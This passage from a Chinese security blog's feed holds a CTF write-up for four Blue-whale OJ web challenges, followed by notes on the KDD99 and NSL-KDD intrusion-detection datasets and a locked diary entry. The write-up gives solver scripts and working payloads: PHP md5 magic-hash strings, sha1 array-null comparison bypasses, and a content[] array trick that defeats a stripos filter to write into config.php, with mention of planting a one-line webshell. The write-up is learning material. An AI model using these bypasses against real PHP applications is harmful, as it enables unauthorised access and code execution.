    <content type="html"><![CDATA[<p>Blue-whale OJ<br>calculator、RapidTyping、Basic PHP、Basic PHP 2 writeup.</p><a id="more"></a><blockquote><p>今天是测试第一阶段的第一天。Keep posting!</p></blockquote><ul><li><a href="#Calculator">Calculator</a></li><li><a href="#RapidTyping">RapidTyping</a></li><li><a href="#Basic-PHP">Basic PHP</a></li><li><a href="#Basic-PHP-2">Basic PHP 2</a></li><li><a href="#总结">总结</a><h1 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h1><center><img src="https://s2.ax1x.com/2020/03/08/3z3niQ.md.jpg" alt="3z3niQ.jpg" border="0"></center>从题目要求可以看到，需要在1.5s内计算出一个比较大的四则运算。按计算器估计是来不及了，由hint我们知道用Python来实现。先贴代码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url = <span class="string">"http://vps1.blue-whale.me:23331/calculator/"</span></span><br><span class="line">cal_session = requests.session()</span><br><span class="line">cal_respond = cal_session.get(url)</span><br><span class="line"><span class="comment"># print(cal_respond.text)</span></span><br><span class="line">soup = BeautifulSoup(cal_respond.text, <span class="string">'lxml'</span>)</span><br><span class="line">span = soup.find(<span class="string">"span"</span>, id=<span class="string">"exp"</span>)</span><br><span class="line">num = eval(span.text.replace(<span class="string">'='</span>, <span class="string">''</span>))</span><br><span class="line"><span class="comment"># print(num)</span></span><br><span class="line">ans = &#123;<span class="string">"answer"</span>: num&#125;</span><br><span class="line">r = cal_session.get(url, params=ans)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>代码分为几个阶段：<br>首先使用了<kbd>requests</kbd>，它是基于urllib3的一个用于发起http请求的包；之后引入了比较常见的<kbd>BeautifulSoup</kbd>。创建一个session对象后，发送请求并获得返回的response对象。</p><center><img src="https://s2.ax1x.com/2020/03/08/3ztwbq.jpg" alt="3ztwbq.jpg" border="0"></center>接下来将其转为BeautifulSoup对象，找到其中id为exp的span标签，将其内容去掉最后的等号后作为参数传入eval函数，将计算结果封装为get的参数，再次请求得到返回的带有flag的网页。<blockquote><p>通过这个入门题目可以练习常用包<kbd>requests</kbd>和<kbd>BeautifulSoup</kbd>的使用。</p></blockquote><h1 id="RapidTyping"><a href="#RapidTyping" class="headerlink" title="RapidTyping"></a>RapidTyping</h1><center><img src="https://s2.ax1x.com/2020/03/08/3zNjl4.jpg" alt="3zNjl4.jpg" border="0"></center>这个题目跟上个题目有点相似，也是要求在短时间内完成验证码输入。题目给出hint说不是用图像识别啥的，那就看看网页源代码吧。<center><img src="https://s2.ax1x.com/2020/03/08/3zUgBR.jpg" alt="3zUgBR.jpg" border="0"></center>做过的CTF题目不多，多是入门题，发现这种比较入门的题目通常要结合Base64之类的东西来考察，或者是在前端做一些限制。把后面这堆结尾是等号的代码拖到Base64解码里会发现是一大堆形似html的代码，其中text标签中包含的就是图片中的字母。下面贴上代码：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://vps1.blue-whale.me:23331/captcha/"</span></span><br><span class="line">session = requests.session()</span><br><span class="line">respond = session.get(url)</span><br><span class="line">soup = BeautifulSoup(respond.text, <span class="string">"lxml"</span>)</span><br><span class="line"><span class="comment"># print(soup.img.attrs["src"])</span></span><br><span class="line">encoded = soup.img.attrs[<span class="string">"src"</span>].lstrip(<span class="string">"data:image/svg+xml;base64,"</span>)</span><br><span class="line"><span class="comment"># print(encoded)</span></span><br><span class="line">encoded = base64.b64decode(encoded)</span><br><span class="line">soup = BeautifulSoup(encoded, <span class="string">"lxml"</span>)</span><br><span class="line">decoded = soup.find_all(name=<span class="string">"text"</span>)</span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> decoded:</span><br><span class="line">        <span class="keyword">if</span> i == int(s[<span class="string">"x"</span>]):</span><br><span class="line">            ans += str(s.text)</span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line">answ = &#123;<span class="string">"code"</span>:ans&#125;</span><br><span class="line">r = session.get(url,params=answ)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>代码逻辑如下：依然是<kbd>requests</kbd>+<kbd>BeautifulSoup</kbd>获取页面内容，截取img标签src属性中的base64部分后解码，将text部分提取出来后带入二重循环，保证将每个字母按照x坐标的顺序加入到ans字符串中。最后将结果作为参数再次请求得到flag。</p><blockquote><p>这里先按x坐标排序后再逐个提取字母速度更快，不过对python的数据结构不甚了解，未能实现。Python的学习有待加强。通过这个题目练习了<kbd>requests</kbd>、<kbd>base64</kbd>和<kbd>BeautifulSoup</kbd>的使用。</p></blockquote><h1 id="Basic-PHP"><a href="#Basic-PHP" class="headerlink" title="Basic PHP"></a>Basic PHP</h1><p>这题在bugku里见过，点开题目即可看到代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Exercise<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>PHP's basic feature<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="comment">&lt;!--好吧其实是老套路了--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'test'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// ========== Stage 1 ========== </span></span></span><br><span class="line"><span class="php">    $test=$_GET[<span class="string">'test'</span>]; </span></span><br><span class="line"><span class="php">    $test=md5($test); </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($test==<span class="string">'0'</span>) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'You passed stage 1.&lt;br /&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">"Game over at stage 1."</span>; </span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// ========== Stage 2 ========== </span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'You passed stage 2.&lt;br /&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Flag: '</span>.$flag;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;hr /&gt;'</span>;</span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>输入name、password和test三个参数即可进入stage1，接下来是md5()漏洞的一个考察：</p><blockquote><p>PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，其中存在一个缺陷，就是它<strong>把每个以“0E”开头的哈希值都解析为0后再进行比较。所以，两个不同的密码经过md5()哈希以后，其哈希值都是以“0E”开头的话，那么PHP将会认为他们是相等的，都是0。</strong></p></blockquote><p>根据这个特性，找到一些md5后产生“0E”开头的字符串作为test的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><p>随后进入stage2，我们发现题目要求name和password的值不同，而sha1的结果相同。想找到这种碰撞的概率太低了，此处考察了 <strong>sha1() 和 md5() 处理数组时会直接返回null，那么可以使 name 和 password为数组类型，sha1 对数组处理后返回 null 绕过 ===(===会判断左右两边的类型和值是否相同) 。</strong> 此时可以令name[]=0&amp;password[]=1，即可得到flag。</p><blockquote><p>问题：令name[]=0&amp;password[]=0为什么不行？总之会返回null，值是0还是1会有影响吗</p></blockquote><table><tr><td bgcolor="#87CEFA">payload:http://vps1.blue-whale.me:23331/feature/?test=s878926199a&password[]=0&name[]=1</td></tr></table><h1 id="Basic-PHP-2"><a href="#Basic-PHP-2" class="headerlink" title="Basic PHP 2"></a>Basic PHP 2</h1><center><img src="https://s2.ax1x.com/2020/03/08/3zINAP.jpg" alt="3zINAP.jpg" border="0"></center>题目给出要求getshell，联想到一句话木马，在这个框中随意输入内容，点击start进入新的页面：<center><img src="https://s2.ax1x.com/2020/03/08/3zoSud.jpg" alt="3zoSud.jpg" border="0"></center>在文本框输入一些内容后点击提交，回显success，此时再点击上面的./config.php会发现之前在文本框中的内容已被写入config.php。再结合下面的代码来看：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]))&#123;</span><br><span class="line">    $filename = <span class="string">'config.php'</span>;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_int(stripos($content, <span class="string">'php'</span>)) || is_int(stripos($content, <span class="string">'&lt;'</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        file_put_contents($filename, $content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br><br>strpos() 函数查找字符串在另一字符串中第一次出现的位置（大小写敏感）。</p></blockquote><p>意思已经比较明显了，我们可以通过content这个参数修改config.php中的内容，但是若想写入php一句话木马，就无法通过stripos()的检验(可以看到对<strong>php和&lt;</strong> 这两个字符串做了检测 )，此时可以利用strpos传入数组时会返回null，经is_int判断后返回false，即可绕过第一个条件判断（看起来stripos也存在这个问题）；这时候就可以通过file_put_content将一句话木马写入config.php了(其实只写一个&lt;即可得到flag)。</p><table><tr><td bgcolor="#87CEFA">payload:http://vps1.blue-whale.me:23360/user/b4466a4c89f48932020df576d9a77e41902f5a0e/index.php?content[]=<</td></tr></table><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>完成了第一天的任务，学到了很多东西，也挖下些坑，比如对md5的一些操作需要总结，一些问题需要解答，要继续学习</p></blockquote><p><a href="https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/" target="_blank" rel="noopener">PHP黑魔法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;calculator、RapidTyping、Basic PHP、Basic PHP 2 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>毕业设计笔记</title>
    <link href="https://purewhitywhite.github.io/2020-01-20/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <id>https://purewhitywhite.github.io/2020-01-20/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/</id>
    <published>2020-01-20T08:11:02.000Z</published>
    <updated>2020-03-08T01:07:44.919Z</updated>
    
    <content type="html"><![CDATA[<p>随着近几年机器学习的迅速发展,许多研究人员使用机器学习算法来解决异常检测领域的难题,并且取得了许多实验成果。请利用该方法尝试实现小型网络的监控。可以利用KDD99数据库。</p><a id="more"></a><h1 id="网络异常流量检测研究"><a href="#网络异常流量检测研究" class="headerlink" title="网络异常流量检测研究"></a>网络异常流量检测研究</h1><h2 id="数据集选择"><a href="#数据集选择" class="headerlink" title="数据集选择"></a>数据集选择</h2><ul><li><p><a href="http://kdd.ics.uci.edu/databases/kddcup99/kddcup99.html" target="_blank" rel="noopener"><strong>KDD99</strong></a><br>该数据集是从一个模拟的美国空军局域网上采集来的9个星期的网络连接数据,分成具有标识的训练数据和未加标识的测试数据。测试数据和训练数据有着不同的概率分布,测试数据包含了一些未出现在训练数据中的攻击类型,这使得入侵检测更具有现实性。</p></li><li><p><a href="https://www.unb.ca/cic/datasets/nsl.html" target="_blank" rel="noopener"><strong>NSL-KDD</strong></a><br>该数据集解决了KDD99数据集中存在的固有问题。NSL-KDD数据集由于缺少基于入侵检测网络的公共数据集，所以NSL-KDD数据集仍然存在一些问题，同时也不是现有真实网络的完美代表。但它仍然可以用作有效的基准数据集，以帮助研究人员比较不同的入侵检测方法。NSL-KDD训练集和测试集的设置是合理的，不同研究工作的评估结果将是一致的和可比的。二者具体区别见下：</p></li></ul><ol><li>It does not include redundant records in the train set, so the classifiers will not be biased towards more frequent records.<blockquote><p>NSL-KDD数据集的训练集中<strong>不包含冗余记录</strong>，所以分类器<strong>不会偏向更频繁的记录</strong>；</p></blockquote></li><li>There is no duplicate records in the proposed test sets; therefore, the performance of the learners are not biased by the methods which have better detection rates on the frequent records.<blockquote><p>NSL-KDD数据集的测试集中<strong>没有重复的记录</strong>，使得<strong>检测率更为准确</strong>。</p></blockquote></li><li>The number of selected records from each difficultylevel group is inversely proportional to the percentage of records in the original KDD data set. As a result, the classification rates of distinct machine learning methods vary in a wider range, which makes it more efficient to have an accurate evaluation of different learning techniques.<blockquote><p>来自每个难度级别组的所选记录的数量与原始KDD数据集中的记录的百分比成反比。结果，不同机器学习方法的分类率在更宽的范围内变化，这使得对不同学习技术的准确评估更有效。</p></blockquote></li><li>The number of records in the train and test sets are reasonable, which makes it affordable to run the experiments on the complete set without the need to randomly select a small portion. Consequently, evaluation results of different research works will be consistent and comparable.<blockquote><p>训练和测试中的记录数量设置是合理的，这使得在整套实验上运行实验成本低廉而无需随机选择一小部分。因此，不同研究工作的评估结果将是一致的和可比较的。</p></blockquote></li></ol><h2 id="常用的深度学习算法"><a href="#常用的深度学习算法" class="headerlink" title="常用的深度学习算法"></a>常用的深度学习算法</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随着近几年机器学习的迅速发展,许多研究人员使用机器学习算法来解决异常检测领域的难题,并且取得了许多实验成果。请利用该方法尝试实现小型网络的监控。可以利用KDD99数据库。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="IDS" scheme="https://purewhitywhite.github.io/tags/IDS/"/>
    
  </entry>
  
  <entry>
    <title>实习日记</title>
    <link href="https://purewhitywhite.github.io/2020-01-07/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>https://purewhitywhite.github.io/2020-01-07/%E5%AE%9E%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2020-01-07T09:08:09.000Z</published>
    <updated>2020-01-21T01:11:22.818Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Please enter password.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a9ed1c0d80c9ec0c2a7263cafe076f953677b69b0476b88b1cbcb76adcaffe42"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Say hello to the 20s.
    
    </summary>
    
    
    
      <category term="工作" scheme="https://purewhitywhite.github.io/tags/%E5%B7%A5%E4%BD%9C/"/>
    
  </entry>
  
</feed>
